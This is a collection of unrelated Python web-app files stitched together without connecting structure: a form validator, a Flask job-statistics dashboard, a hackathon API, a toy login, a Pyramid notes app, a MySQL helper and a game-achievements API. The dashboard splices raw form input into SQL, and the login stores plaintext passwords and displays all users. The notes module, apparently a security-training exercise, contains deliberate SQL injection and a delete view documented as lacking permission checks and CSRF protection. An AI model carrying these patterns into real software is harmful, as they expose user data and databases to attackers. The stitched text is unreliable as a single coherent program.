        sub = (subtable and subname)
        query = "SELECT COALESCE(COUNT(" + table + "." + name + "), 0) FROM " + table
        if (sub):
            query += " LEFT JOIN " + subtable
        query += " WHERE (" + table + "." + name + " = :x"                    
        if (sub):
            query += " AND " + subtable + ".id = " + str(form[subname].data) #Dangerous, but in our uses it isn't user input                    
        query += ");"
        stmt = text(query)
        res = db.engine.execute(stmt, x=field.data)                    
        for row in res:
            if (row[0] > 0):
                raise ValidationError(message)

    return _unique

def different(fieldname, message = None):
    if not message:
        message = "This field needs to have a different value than " + orm[fieldname].label + "."
    
    def _different(form, field):
        if (field.data is form[fieldname].data):
            raise ValidationError(message)

    return _different

import os
from flask import Flask
from flask import redirect
from flask import render_template
from flask import request
import psycopg2
import timeit

from fieldValues import faculty_status, fields_of_study, departments, careerareas,ipedssectornames                    

from occupations import occupations

project_dir = os.path.dirname(os.path.abspath(__file__))


app = Flask(__name__,
            static_url_path='',
            static_folder='static')




query1 = "SELECT year,faculty, count(*) as N from hej where faculty=1 group by faculty,year;"


@app.route('/',methods=["GET"])
def home():
    return render_template("home.html")


@app.route('/demo1', methods=["GET", "POST"])
def demo1():
    z = demo(6)
    return render_template("demo1.html", query=query1, rows=z)

@app.route('/demo2', methods=["GET", "POST"])
def demo2():
    z = demo(1)
    results = [[x[0],x[1],x[2]] for x in z]
    return render_template("demo2.html", query=query1, rows=results)

@app.route('/facnonfac', methods=["GET", "POST"])
def facnonfac():
    z = demo(1)
    results = [[x[0],x[1],x[2]] for x in z]
    return render_template("demo2.html", query=query1, rows=results)

@app.route('/chartdemo', methods=["GET","POST"])
def chartdemo():
    if request.method=="GET":
        return render_template("chartdemoForm.html",ipedssectornames=ipedssectornames)
    else:
        print(request.form)
        year = request.form.getlist('year')                    
        ipeds = request.form.getlist('ipedssectornames')                    
        query = "SELECT hej.year,hej.faculty+2*hej.postdoctoral as facStatus,count(*) from hej,maintable where (hej.jobid=maintable.jobid) and "
        query += makeYears(year)+" and "
        query += makeStrings('ipedssectorname',ipeds)
        query += " group by hej.year, facStatus"
        print(query)
        z = queryAll(query)
        print("Results of query are:")
        if (z==[]):
            print("no results")
            return render_template("noResults.html",query=query)
        else:
            print(z)
        years = [int(y) for y in year]
        r = [(y,list(a[2] for a in [b for b in z if b[1]==y])) for y in [0,1,2]]
        print("r=")
        print(r)
        print('years='+str(years))
        return render_template("chartdemoResult.html",
                  ipedssectornames=ipedssectornames,
                  query=query, years=years, z=z, r=r)



@app.route('/chartdemoORIG', methods=["GET"])
def chartdemoORIG():
    return render_template("chartdemoORIG.html")


@app.route('/demo4', methods=["GET", "POST"])
def demo4():
    print("in demo4")
    if request.method=="GET":
        return render_template("demo4.html",ipedssectornames=ipedssectornames)
    else:
        print(request.form)
        year = request.form.getlist('year')                    
        ipeds = request.form.getlist('ipedssectornames')                    
        query = "SELECT count(*) from hej,maintable where (hej.jobid=maintable.jobid) and "
        query += makeYears(year)+" and "
        query += makeStrings('ipedssectorname',ipeds)
        query += " group by hej.year"
        print(query)
        z = queryAll(query)
        print(z)
        if (z==[]):
            print("no results")
            return render_template("noResults.html",query=query)
        z1 = [x[0] for x in z]
        z2 = [makeObj(x) for x in z1]
        vals = []
        for i in range(0,len(year)):
            vals += [makeObj2(year[i],z1[i])]

        print(z)
        print(z1)
        print(z2)
        print(vals)
        years = [int(y) for y in year]
        return render_template("demo4b.html", query=query, year=years, z1=z1)



@app.route('/demo3', methods=["GET", "POST"])
def demo3():
    if request.method=="GET":
        return render_template("demo3.html",faculty_status=faculty_status,fields_of_study=fields_of_study, departments=departments,careerareas=careerareas,ipedssectornames=ipedssectornames,occupations=occupations)
    else:
        print(request.form)
        jobtype = request.form.getlist('jobtype')
        staff = request.form.getlist('staff')
        fac = request.form.getlist('fac')
        year = request.form.getlist('year')                    
        fos = request.form.getlist('fos')
        dept = request.form.getlist('dept')
        divinc = request.form.getlist('diversityandinclusion')
        rsh1 = request.form.getlist('isresearch1institution')
        careerarea = request.form.getlist('careerarea')
        ipeds = request.form.getlist('ipedssectornames')                    
        occs = request.form.getlist('occupations')
        min_ed = request.form.get('minimumedurequirements')
        max_ed = request.form.get('maximumedurequirements')
        min_exp = request.form.get('minimumexperiencerequirements')
        print('min ed = '+min_ed)
        query = "SELECT count(*) from hej,maintable where (hej.jobid=maintable.jobid) and "
        query += makeBoolean(jobtype)+" and "
        if (staff!=[]):
          query += " (faculty=0 and postdoctoral=0) and "
        query += makeBoolean(fos)+" and "
        query += makeYears(year)+" and "
        query += makeBoolean(dept)+" and "
        query += makeBoolean(fac) + " and "
        query += makeBoolean(divinc+rsh1) + " and "
        query += makeCareerAreas(careerarea) + " and "
        query += makeStrings('ipedssectorname',ipeds) + " and "
        query += makeStrings('occupation',occs) + " and "
        query += "minimumedurequirements >= "+min_ed+" and "
        query += "maximumedurequirements <= "+max_ed+" and "
        query += "minimumexperiencerequirements >= "+min_exp
        query += " group by hej.year"
        print(query)
        z = queryAll(query)
        print(z)
        if (z==[]):
            print("no results")
            return render_template("noResults.html",query=query)
        z1 = [x[0] for x in z]
        z2 = [makeObj(x) for x in z1]
        vals = []
        for i in range(0,len(year)):
            vals += [makeObj2(year[i],z1[i])]

        print(z)
        print(z1)
        print(z2)
        print(vals)
        years = [int(y) for y in year]
        return render_template("demo3b.html", query=query, year=years, z1=z1)



def makeObj(x):
    z={}
    z["date"]="1-May-12"
    z["close"]=x
    return z
def makeObj2(y,x):
    z={}
    z["date"]="1-Jan-"+str(y)
    z["close"]=x
    return z

def makeBoolean(list):
    if (list==[]):
        return "true"
    result = "("
    for i in range(0,len(list)-1):
        result+= list[i]+"=1 or "
    result += list[len(list)-1]+" = 1 ) "
    return result

def makeYears(list):
    if (list==[]):
        return "true"
    result = "("
    for i in range(0,len(list)-1):
        result+= " hej.year = "+list[i]+" or "
    result += " hej.year = "+ list[len(list)-1]+" ) "
    return result

def makeCareerAreas(list):
    if (list==[]):
        return "true"
    result = "("
    for i in range(0,len(list)-1):
        result+= " maintable.careerarea = '"+list[i]+"' or "
    result += " maintable.careerarea = '"+ list[len(list)-1]+"' ) "
    print('result is '+result)
    return result

def makeStrings(columnname,list):
    print("in makeStrings")
    print(list)
    if (list==[]):
        return "true"
    result = "("
    for i in range(0,len(list)-1):
        result+= " "+columnname + " = '"+list[i]+"' or "
    result += " "+columnname + " = '"+ list[len(list)-1]+"' ) "
    print('result is '+result)
    return result

def demo(n):
    switcher = {
    1: "SELECT year,faculty, count(*) as N from hej where faculty=1 group by faculty,year;",
    2: "SELECT fulltimecontingent, count(*) from hej where year =2010 group by  fulltimecontingent",
    3: "SELECT parttimecontingent, count(*) from hej where year =2010 group by  parttimecontingent",
    4: "SELECT year,count(*) from hej where (tenured=1 or tenured_track=1) group by year;",
    5: "SELECT count(*) from hej where (tenured = 1 or tenured_track =1) and (year=2007 or year=2012 or year=2017) group by year",
    6: "SELECT count(*) as N, maintable.minimumedurequirements as R from hej,maintable where (hej.jobid=maintable.jobid) and (hej.faculty = 1) and (hej.year>= 2010) group by maintable.minimumedurequirements"
    }
    z = queryAll(switcher.get(n,0))
    return z

def queryAll(query):
    """ Connect to the PostgreSQL database server """
    conn = None
    result = None
    try:
        # read connection parameters
        conn_string = "host='localhost' dbname='data1000' user='postgres' password='postgres'"


        # connect to the PostgreSQL server
        print('Connecting to the PostgreSQL database...')
        conn = psycopg2.connect(conn_string)

        # create a cursor
        cur = conn.cursor()

 # execute a statement
        cur.execute(query)

        # display the PostgreSQL database server version
        result = cur.fetchall()
        print(result)

     # close the communication with the PostgreSQL
        cur.close()
    except (Exception, psycopg2.DatabaseError) as error:
        print(error)
    finally:
        if conn is not None:
            conn.close()
            print('Database connection closed.')
        return result




if __name__ == "__main__":
    app.run(debug=True)

from flask import Flask, jsonify, make_response,request, g
from flask_restful import Api
from celery import Celery
from sqlalchemy.ext.automap import automap_base
from sqlalchemy import create_engine
from sqlalchemy.orm import Session
from common.utils import unauthorized,headers,not_found

from config import load_env_variables, DevelopmentConfig, ProdConfig

#loading environment variables
load_env_variables()

app = Flask(__name__)
app.config.from_object(DevelopmentConfig)#loading config data into flask app from config object.
api = Api(app)

#reflecting classes
print("Reflecting classes...")
Base = automap_base()
engine = create_engine(app.config["SQLALCHEMY_DATABASE_URI"],pool_size=20,max_overflow=20,pool_pre_ping=True)
Base.prepare(engine, reflect=True)
print("Classes reflected...")


@app.before_request
def create_session():
    """
    Before processing any request. Create a session by checking out a connection from the connection pool.
    Also set request global variables to be accessed for the life time of the request                    

    """
    g.session = Session(engine)
    g.Base = Base

@app.after_request
def commit_and_close_session(resp):
    """
    After all the processing is done. Commit the changes and close the session to return the connection object back to the connection pool.
    """
    g.session.commit()
    g.session.close()
    return resp

#loading resources
from resources.faqs import Faqs_RUD, Faqs_CR
from resources.announcements import Announcements_RUD, Announcements_CR
from resources.hardware import Hardware_RUD, Hardware_CR
from resources.sponsors import Sponsor_RD, Sponsor_CR
from resources.schedule import Schedule_RUD, Schedule_CR
from resources.applications import Applications_RU, Applications_CR

@api.representation('application/json')
def ret_json(data, code, headers=None):
    """
    Create proper request object based on the return dictionary.
    """
    if code == 204:
        resp = make_response('', code)
    else:
        resp = make_response(jsonify(data), code)
    resp.headers.extend(headers)
    return resp

#might only need this for email sending so that email sending does not clog up the resources
task_queue=Celery("SpartaHack_API_2019",broker=app.config["CELERY_BROKER_URL"])

#adding resources. Just flask-restful things :)
api.add_resource(Faqs_RUD,"/faqs/<int:faq_id>")
api.add_resource(Faqs_CR,"/faqs")
api.add_resource(Announcements_RUD,"/announcements/<int:announcement_id>")
api.add_resource(Announcements_CR,"/announcements")
api.add_resource(Hardware_RUD,"/hardware/<int:hardware_id>")
api.add_resource(Hardware_CR,"/hardware")
api.add_resource(Sponsor_RD,"/sponsors/<int:sponsor_id>")
api.add_resource(Sponsor_CR,"/sponsors")
api.add_resource(Schedule_RUD,"/schedule/<int:schedule_id>")
api.add_resource(Schedule_CR,"/schedule")
api.add_resource(Applications_RU,"/applications/<int:application_id>")
api.add_resource(Applications_CR,"/applications")


@app.route("/")
def helloworld():
    """
    For flask app test and general info about the API.
    Will also be used to check if the api is live or not on the slack hook
    """
    metadata = {
                "Organization":"SpartaHack",
                "Backend Developers":"Yash, Jarek",
                "Frontend Developers":"Harrison, Jessica, Jarek",
                "Contact":"hello@spartahack.com",
                "Version":"0.5.0"
               }
    return (metadata,200,headers)


if __name__ == '__main__': #running on local server. This needs to change for prod
    app.run(debug=True)

from marshmallow import Schema,fields                    
import ipaddress

"""
schema.dump = used for converting the automap.faqs object to a dictionary good for returning ie cleaning unnecessary fields
schema.validate(request.get_json(force=True)) = used to validate if all the data required for updating and creating the faq is present.4
dump_only = Fields that we need to display when returning the item
load_only = Fields that we need only while dumping from python objects. We use it to stop marshmallow from dumping it while using dump()
"""
def ip_test(ip):                    
        try:                    
            ipaddress.ip_address(ip)                    
            return True                    
        except ValueError:
            return False                    

class Faq_Schema(Schema):
    id = fields.Integer()                    
    question = fields.String(required=True)
    answer = fields.String(required=True)
    display = fields.Boolean(required=True)
    priority = fields.Integer(required=True)
    placement = fields.String(required=True)
    user_id = fields.Integer()                    

class Announcement_Schema(Schema):
    id = fields.Integer()                    
    title = fields.String(required=True)
    description = fields.String(required=True)
    pinned = fields.Boolean(required=True)
    created_at = fields.DateTime(dump_only=True)
    updated_at = fields.DateTime(dump_only=True)

class Hardware_Schema(Schema):
    id = fields.Integer()                    
    item = fields.String(required=True)
    lender = fields.String(required=True)
    quantity = fields.String(required=True)
    created_at = fields.DateTime(load_only=True)
    updated_at = fields.DateTime(load_only=True)

class Sponsor_Schema(Schema):
    id = fields.Integer()                    
    name = fields.String(required=True)
    level = fields.String(required=True)
    url = fields.URL(required=True)
    logo_svg_light = fields.String(required=True)
    logo_svg_dark = fields.String()
    logo_png_light = fields.String(required=True)
    logo_png_dark = fields.String()
    created_at = fields.DateTime(load_only=True)
    updated_at = fields.DateTime(load_only=True)

class Schedule_Schema(Schema):
    id = fields.Integer()                    
    title = fields.String(required=True)
    description = fields.String(required=True)
    time = fields.DateTime(required=True)
    location = fields.String(required=True)
    created_at = fields.DateTime(load_only=True)
    updated_at = fields.DateTime(dump_only=True)

class Application_Schema(Schema):
    id = fields.Integer()                    
    user_id = fields.Integer(required=True  )
    birth_day = fields.Integer(required=True)
    birth_month = fields.Integer(required=True)
    birth_year = fields.Integer(required=True)
    education = fields.String(required=True)
    university = fields.String()
    other_university = fields.String()
    travel_origin = fields.String()
    graduation_season = fields.String(required=True)
    graduation_year = fields.Integer(required=True)
    major = fields.List(fields.String)
    hackathons = fields.Integer(required=True)
    github = fields.URL()
    linkedin = fields.URL()
    website = fields.URL()
    devpost = fields.URL()
    other_link = fields.URL()
    statement = fields.String()
    created_at = fields.DateTime()
    updated_at = fields.DateTime()
    race = fields.List(fields.String)
    gender = fields.String()
    outside_north_america = fields.String()
    status = fields.String()
    accepted_date = fields.DateTime()

class User_Schema(Schema):
    id = fields.Integer()                    
    email = fields.Email(required=True)                    
    encrypted_password = fields.String(required=True)
    reset_password_token = fields.String()                    
    reset_password_sent_at = fields.DateTime()
    remember_created_at = fields.DateTime()
    sign_in_count = fields.Integer()
    current_sign_in_at = fields.DateTime()
    last_sign_in_at = fields.DateTime()
    current_sign_in_ip = fields.String(validate=ip_test)
    last_sign_in_ip = fields.String(validate=ip_test)
    created_at = fields.DateTime(required=True)                    
    updated_at = fields.DateTime(required=True)
    auth_token =fields.String()                    
    confirmation_token = fields.String()
    confirmed_at = fields.DateTime()
    confirmation_sent_at = fields.DateTime()
    role = fields.Integer()                    
    first_name = fields.String()                    
    last_name = fields.String()                    
    checked_in = fields.Boolean(required=True)                    

from flask_restful import Resource
from werkzeug.exceptions import BadRequest
from flask import request,jsonify,g
from datetime import datetime
from sqlalchemy import exists,and_
from sqlalchemy.orm.exc import NoResultFound
from common.json_schema import User_Schema
from common.utils import headers,is_logged_in,has_admin_privileges
from common.utils import bad_request,unauthorized,forbidden,not_found,internal_server_error,unprocessable_entity,conflict

class Users_RUD(Resource):
    def get(self,user_id):
        pass                    

    def put(self,user_id):
        pass                    

    def delete(self,user_id):
        pass                    

class Users_CR(Resource):
    def get(self):                    
        pass                    

    def post(self):                    
        pass                    

from flask import Flask, render_template, url_for, flash, redirect, request
from flask_sqlalchemy import SQLAlchemy 

app = Flask(__name__, static_folder='static', static_url_path='')
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///site.sqlite3'
app.config['SECRET_KEY'] = "random string"
db = SQLAlchemy(app)

class User(db.Model):
	id = db.Column(db.Integer, primary_key=True)
	email = db.Column(db.String(50))                    
	password = db.Column(db.String(20))

	def __init__(self, email, password):                    
		self.email = email                    
		self.password = password

@app.route('/')
def home():
	return render_template('home.html')

@app.route('/tables')
def tables():
	return render_template('tables.html', User=User.query.all())                    

@app.route('/login', methods=['GET', 'POST'])
def login():
	if request.method == 'POST':
		user = User(request.form['email'], request.form['password'])                    
		db.session.add(user)                    
		db.session.commit()                    
		return redirect(url_for('tables'))                    
	return render_template('login.html')

# Drop/Create all Tables
db.drop_all()
db.create_all()

if __name__ == '__main__':
	app.run(debug = True)
	

from dataclasses import dataclass
from typing import Optional, List, Union, Any, Tuple

from . import db


@dataclass
class Note:
    note_id: Optional[int]
    user_id: int
    content: str
    created_at: Optional[str] = None
    updated_at: Optional[str] = None

    def __json__(self, *args):
        return vars(self)


def find_notes(conn,
               *,
               user_id: Optional[int] = None,
               from_date: Optional[str] = None,
               to_date: Optional[str] = None,
               search: Optional[str] = None) -> List[Note]:
    conditions = []
    params: Union[tuple,Tuple[Any]] = ()

    # SQL injection here
    if user_id:
        conditions.append(f'user_id = {user_id}')

    # SQL injection safe
    if from_date:
        conditions.append('updated_at >= ?')
        params += (from_date,)

    # SQL injection
    if to_date:
        conditions.append(f"updated_at <= '{to_date}'")

    # SQL-injection safe - but does not handle percent in search string
    if search:
        conditions.append(f"LOWER(content) LIKE ?")
        params += (f'%{search.lower()}%',)

    sql = ('SELECT note_id, user_id, content, created_at, updated_at '                    
           ' FROM note' +  # noqa
           ' WHERE ' + ' AND '.join(conditions) + ' ORDER BY updated_at DESC')

    with db.cursor(conn) as cur:
        return db.fetchall(cur, Note, sql, params)


def _find_note(cur, note_id):
    # SQL injection here
    return db.fetchone(cur, Note,
                       f'SELECT note_id, user_id, content,'                    
                       f' created_at, updated_at'
                       f' FROM note WHERE note_id = {note_id}',
                       ())


def find_note(conn, note_id) -> Optional[Note]:
    with db.cursor(conn) as cur:
        return _find_note(cur, note_id)


def delete_note(conn, note_id):
    with db.cursor(conn) as cur:
        # SQL injection here
        cur.execute(f'DELETE from note WHERE note_id = {note_id}')


def save_note(conn, note: Note) -> Note:
    with db.cursor(conn) as cur:
        if note.note_id:
            cur.execute(
                'UPDATE note SET content = ?, updated_at = CURRENT_TIMESTAMP'                    
                ' WHERE note_id = ?',
                (note.content, note.note_id))                    
        else:
            cur.execute('INSERT INTO note(user_id, content) VALUES(?, ?)',                    
                        (note.user_id, note.content))                    
            note.note_id = cur.lastrowid
        new_note = _find_note(cur, note.note_id)

    return new_note

from pyramid.httpexceptions import HTTPFound, HTTPNoContent
from pyramid.request import Request
from pyramid.security import Allow
from pyramid.view import view_config

from . import db
from .app import RootContextFactory
from .embed import embeddable


class NotesFactory(RootContextFactory):

    def __getitem__(self, note_id):
        note = db.note.find_note(self.request.db, note_id)
        if note:
            return NoteResource(note)

        raise KeyError(note_id)


class NoteResource:
    def __init__(self, note: db.note.Note):
        self.note = note

    @property
    def __acl__(self):
        return [
            (Allow, self.note.user_id, ('view', 'edit'))
        ]


###############################################################################
# Notes
###############################################################################

@view_config(route_name='note-action',
             request_method=('GET', 'POST'),
             request_param='action=delete')                    
def delete_note_action(request):
    """Unsafe delete of note.

    - Deletes as a side effect of GET request
    - Does not validate arguments (SQL injection due to unsafe implementation
      of delete_note)
    - Does not check permissions
    - Vulnerable to CSRF
    """

    db.note.delete_note(request.db, request.params['id'])
    return HTTPNoContent()                    


@view_config(route_name='notes', permission='view',
             renderer='notes/list-notes.jinja2')
def notes_listing(request):
    search = request.params.get('search', '')
    from_date = request.params.get('from', '')
    to_date = request.params.get('to', '')
    notes = db.note.find_notes(request.db,
                               user_id=request.user.user_id,
                               from_date=from_date,
                               to_date=to_date,
                               search=search)

    return {
        'notes': notes,
        'from': from_date,
        'to': to_date,
        'search': search
    }


@view_config(route_name='note', permission='edit', request_method='GET',
             renderer='notes/edit-note.jinja2', decorator=embeddable)
def edit_note(context: NoteResource, request: Request):
    return dict(title='Redigera anteckning',
                note=context.note)


@view_config(route_name='note', permission='edit', request_method='POST',
             renderer='notes/edit-note.jinja2', decorator=embeddable)
def save_note(context: NoteResource, request: Request):
    _save_or_create_note(context.note, request)
    return HTTPFound(location=request.route_url('notes'))


@view_config(route_name='new-note', permission='edit',
             renderer='notes/edit-note.jinja2', require_csrf=True,
             decorator=embeddable)
def create_note(request: Request):
    note = db.note.Note(None,
                        user_id=request.user.user_id,
                        content=request.params.get('note', ''))
    if request.method == 'POST':
        _save_or_create_note(note, request)
        return HTTPFound(location=request.route_url('notes'))

    return dict(title='Ny anteckning',
                note=note)


def _save_or_create_note(note: db.note.Note, request: Request):
    content: str = request.params['note']
    note.content = content.replace('\r', '')
    return db.note.save_note(request.db, note)


def includeme(config):
    config.add_route('notes', '/notes', factory=NotesFactory)
    config.add_route('new-note', '/notes/new')
    config.add_route('note',
                     pattern='/notes/{note}',
                     traverse='/{note}',
                     factory=NotesFactory)

    config.add_route('note-action', '/api/notes')

# a cursor is the object we use to interact with the database
import pymysql.cursors


# this class will give us an instance of a connection to our database
class MySQLConnection:
    def __init__(self, db):
        connection = pymysql.connect(host='localhost',
                                     user='root',  # change the user and password as needed
                                     password='',                    
                                     db=db,
                                     charset='utf8mb4',
                                     cursorclass=pymysql.cursors.DictCursor,
                                     autocommit=True)
        # establish the connection to the database
        self.connection = connection

    # the method to query the database
    def query_db(self, query, data=None):
        with self.connection.cursor() as cursor:
            try:
                query = cursor.mogrify(query, data)
                print("Running Query:", query)

                executable = cursor.execute(query, data)
                if query.lower().find("insert") >= 0:
                    # INSERT queries will return the ID NUMBER of the row inserted
                    self.connection.commit()
                    return cursor.lastrowid
                elif query.lower().find("select") >= 0:
                    # SELECT queries will return the data from the database as a LIST OF DICTIONARIES
                    result = cursor.fetchall()
                    return result
                else:
                    # UPDATE and DELETE queries will return nothing
                    self.connection.commit()
            except Exception as e:
                # if the query fails the method will return FALSE
                print("Something went wrong", e)
                return False
            finally:
                # close the connection
                self.connection.close()
            # connectToMySQL receives the database we're using and uses it to create an instance of MySQLConnection


def connectToMySQL(db):
    return MySQLConnection(db)



from flask import request

from api import *

import faf.db as db

SELECT_ACHIEVEMENTS_QUERY = """SELECT
                    ach.id,
                    ach.type,
                    ach.total_steps,
                    ach.revealed_icon_url,
                    ach.unlocked_icon_url,
                    ach.initial_state,
                    ach.experience_points,
                    COALESCE(name_langReg.value, name_lang.value, name_def.value) as name,
                    COALESCE(desc_langReg.value, desc_lang.value, desc_def.value) as description
                FROM achievement_definitions ach
                LEFT OUTER JOIN messages name_langReg
                    ON ach.name_key = name_langReg.key
                        AND name_langReg.language = %(language)s
                        AND name_langReg.region = %(region)s
                LEFT OUTER JOIN messages name_lang
                    ON ach.name_key = name_lang.key
                        AND name_lang.language = %(language)s
                LEFT OUTER JOIN messages name_def
                    ON ach.name_key = name_def.key
                        AND name_def.language = 'en'
                        AND name_def.region = 'US'
                LEFT OUTER JOIN messages desc_langReg
                    ON ach.description_key = desc_langReg.key
                        AND desc_langReg.language = %(language)s
                        AND desc_langReg.region = %(region)s
                LEFT OUTER JOIN messages desc_lang
                    ON ach.description_key = desc_lang.key
                        AND desc_lang.language = %(language)s
                LEFT OUTER JOIN messages desc_def
                    ON ach.description_key = desc_def.key
                        AND desc_def.language = 'en'
                        AND desc_def.region = 'US'"""


@app.route('/achievements')
def achievements_list():
    """Lists all achievement definitions.

    HTTP Parameters::

        language    string  The preferred language to use for strings returned by this method
        region      string  The preferred region to use for strings returned by this method

    :return:
        If successful, this method returns a response body with the following structure::

            {
              "updated_achievements": [
                {
                  "id": string,
                  "name": string,
                  "description": string,
                  "type": string,
                  "total_steps": integer,
                  "initial_state": string,
                  "experience_points": integer,
                  "revealed_icon_url": string,
                  "unlocked_icon_url": string
                }
              ]
            }
    """
    language = request.args.get('language', 'en')
    region = request.args.get('region', 'US')

    with db.connection:
        cursor = db.connection.cursor(db.pymysql.cursors.DictCursor)
        cursor.execute(SELECT_ACHIEVEMENTS_QUERY + " ORDER BY `order` ASC",
                       {
                           'language': language,
                           'region': region
                       })

        return flask.jsonify(items=cursor.fetchall())


@app.route('/achievements/<achievement_id>')
def achievements_get(achievement_id):
    """Gets an achievement definition.

    HTTP Parameters::

        language    string  The preferred language to use for strings returned by this method
        region      string  The preferred region to use for strings returned by this method

    :param achievement_id: ID of the achievement to get

    :return:
        If successful, this method returns a response body with the following structure::

            {
              "id": string,
              "name": string,
              "description": string,
              "type": string,
              "total_steps": integer,
              "initial_state": string,
              "experience_points": integer,
              "revealed_icon_url": string,
              "unlocked_icon_url": string
            }
    """
    language = request.args.get('language', 'en')
    region = request.args.get('region', 'US')

    with db.connection:
        cursor = db.connection.cursor(db.pymysql.cursors.DictCursor)
        cursor.execute(SELECT_ACHIEVEMENTS_QUERY + "WHERE ach.id = %(achievement_id)s",
                       {
                           'language': language,
                           'region': region,
                           'achievement_id': achievement_id
                       })

        return cursor.fetchone()


@app.route('/achievements/<achievement_id>/increment', methods=['POST'])
def achievements_increment(achievement_id):
    """Increments the steps of the achievement with the given ID for the currently authenticated player.

    HTTP Parameters::

        player_id    integer ID of the player to increment the achievement for
        steps        string  The number of steps to increment

    :param achievement_id: ID of the achievement to increment

    :return:
        If successful, this method returns a response body with the following structure::

            {
              "current_steps": integer,
              "current_state": string,
              "newly_unlocked": boolean,
            }
    """
    # FIXME get player ID from OAuth session
    player_id = int(request.form.get('player_id'))
    steps = int(request.form.get('steps', 1))

    return flask.jsonify(increment_achievement(achievement_id, player_id, steps))


@app.route('/achievements/<achievement_id>/setStepsAtLeast', methods=['POST'])
def achievements_set_steps_at_least(achievement_id):
    """Sets the steps of an achievement. If the steps parameter is less than the current number of steps
     that the player already gained for the achievement, the achievement is not modified.
     This function is NOT an endpoint."""
    # FIXME get player ID from OAuth session
    player_id = int(request.form.get('player_id'))
    steps = int(request.form.get('steps', 1))

    return flask.jsonify(set_steps_at_least(achievement_id, player_id, steps))


@app.route('/achievements/<achievement_id>/unlock', methods=['POST'])
def achievements_unlock(achievement_id):
    """Unlocks an achievement for the currently authenticated player.

    HTTP Parameters::

        player_id    integer ID of the player to unlock the achievement for

    :param achievement_id: ID of the achievement to unlock

    :return:
        If successful, this method returns a response body with the following structure::

            {
              "newly_unlocked": boolean,
            }
    """
    # FIXME get player ID from OAuth session
    player_id = int(request.form.get('player_id'))

    return flask.jsonify(unlock_achievement(achievement_id, player_id))


@app.route('/achievements/<achievement_id>/reveal', methods=['POST'])
def achievements_reveal(achievement_id):
    """Reveals an achievement for the currently authenticated player.

    HTTP Parameters::

        player_id    integer ID of the player to reveal the achievement for

    :param achievement_id: ID of the achievement to reveal

    :return:
        If successful, this method returns a response body with the following structure::

            {
              "current_state": string,
            }
    """
    # FIXME get player ID from OAuth session
    player_id = int(request.form.get('player_id'))

    return flask.jsonify(reveal_achievement(achievement_id, player_id))


@app.route('/achievements/updateMultiple', methods=['POST'])
def achievements_update_multiple():
    """Updates multiple achievements for the currently authenticated player.

    HTTP Body:
        In the request body, supply data with the following structure::

            {
              "player_id": integer,
              "updates": [
                "achievement_id": string,
                "update_type": string,
                "steps": integer
              ]
            }

        ``updateType`` being one of "REVEAL", "INCREMENT" or "UNLOCK"

    :return:
        If successful, this method returns a response body with the following structure::

            {
              "updated_achievements": [
                "achievement_id": string,
                "current_state": string,
                "current_steps": integer,
                "newly_unlocked": boolean,
              ],
            }
    """
    # FIXME get player ID from OAuth session
    player_id = request.json['player_id']

    updates = request.json['updates']

    result = dict(updated_achievements=[])

    for update in updates:
        achievement_id = update['achievement_id']
        update_type = update['update_type']

        update_result = dict(achievement_id=achievement_id)

        if update_type == 'REVEAL':
            reveal_result = reveal_achievement(achievement_id, player_id)
            update_result['current_state'] = reveal_result['current_state']
            update_result['current_state'] = 'REVEALED'
        elif update_type == 'UNLOCK':
            unlock_result = unlock_achievement(achievement_id, player_id)
            update_result['newly_unlocked'] = unlock_result['newly_unlocked']
            update_result['current_state'] = 'UNLOCKED'
        elif update_type == 'INCREMENT':
            increment_result = increment_achievement(achievement_id, player_id, update['steps'])
            update_result['current_steps'] = increment_result['current_steps']
            update_result['current_state'] = increment_result['current_state']
            update_result['newly_unlocked'] = increment_result['newly_unlocked']
        elif update_type == 'SET_STEPS_AT_LEAST':
            set_steps_at_least_result = set_steps_at_least(achievement_id, player_id, update['steps'])
            update_result['current_steps'] = set_steps_at_least_result['current_steps']
            update_result['current_state'] = set_steps_at_least_result['current_state']
            update_result['newly_unlocked'] = set_steps_at_least_result['newly_unlocked']

        result['updated_achievements'].append(update_result)

    return result


@app.route('/players/<int:player_id>/achievements')
def achievements_list_player(player_id):
    """Lists the progress of achievements for a player.

    :param player_id: ID of the player.

    :return:
        If successful, this method returns a response body with the following structure::

            {
              "items": [
                {
                  "achievement_id": string,
                  "state": string,
                  "current_steps": integer,
                  "create_time": long,
                  "update_time": long
                }
              ]
            }
    """
    with db.connection:
        cursor = db.connection.cursor(db.pymysql.cursors.DictCursor)
        cursor.execute("""SELECT
                            achievement_id,
                            current_steps,
                            state,
                            UNIX_TIMESTAMP(create_time) as create_time,
                            UNIX_TIMESTAMP(update_time) as update_time
                        FROM player_achievements
                        WHERE player_id = '%s'""" % player_id)                    

        return flask.jsonify(items=cursor.fetchall())


def increment_achievement(achievement_id, player_id, steps):
    steps_function = lambda current_steps, new_steps: current_steps + new_steps
    return update_steps(achievement_id, player_id, steps, steps_function)


def set_steps_at_least(achievement_id, player_id, steps):
    steps_function = lambda current_steps, new_steps: max(current_steps, new_steps)
    return update_steps(achievement_id, player_id, steps, steps_function)


def update_steps(achievement_id, player_id, steps, steps_function):
    """Increments the steps of an achievement. This function is NOT an endpoint.

    :param achievement_id: ID of the achievement to increment
    :param player_id: ID of the player to increment the achievement for
    :param steps: The number of steps to increment
    :param steps_function: The function to use to calculate the new steps value. Two parameters are passed; the current
    step count and the parameter ``steps``

    :return:
        If successful, this method returns a dictionary with the following structure::

            {
              "current_steps": integer,
              "current_state": string,
              "newly_unlocked": boolean,
            }
    """
    achievement = achievements_get(achievement_id)

    with db.connection:
        cursor = db.connection.cursor(db.pymysql.cursors.DictCursor)
        cursor.execute("""SELECT
                            current_steps,
                            state
                        FROM player_achievements
                        WHERE achievement_id = %s AND player_id = %s""",
                       (achievement_id, player_id))

        player_achievement = cursor.fetchone()

        new_state = 'REVEALED'
        newly_unlocked = False

        current_steps = player_achievement['current_steps'] if player_achievement else 0
        new_current_steps = steps_function(current_steps, steps)

        if new_current_steps >= achievement['total_steps']:
            new_state = 'UNLOCKED'
            new_current_steps = achievement['total_steps']
            newly_unlocked = player_achievement['state'] != 'UNLOCKED' if player_achievement else True

        cursor.execute("""INSERT INTO player_achievements (player_id, achievement_id, current_steps, state)
                        VALUES
                            (%(player_id)s, %(achievement_id)s, %(current_steps)s, %(state)s)
                        ON DUPLICATE KEY UPDATE
                            current_steps = VALUES(current_steps),
                            state = VALUES(state)""",
                       {
                           'player_id': player_id,
                           'achievement_id': achievement_id,
                           'current_steps': new_current_steps,
                           'state': new_state,
                       })

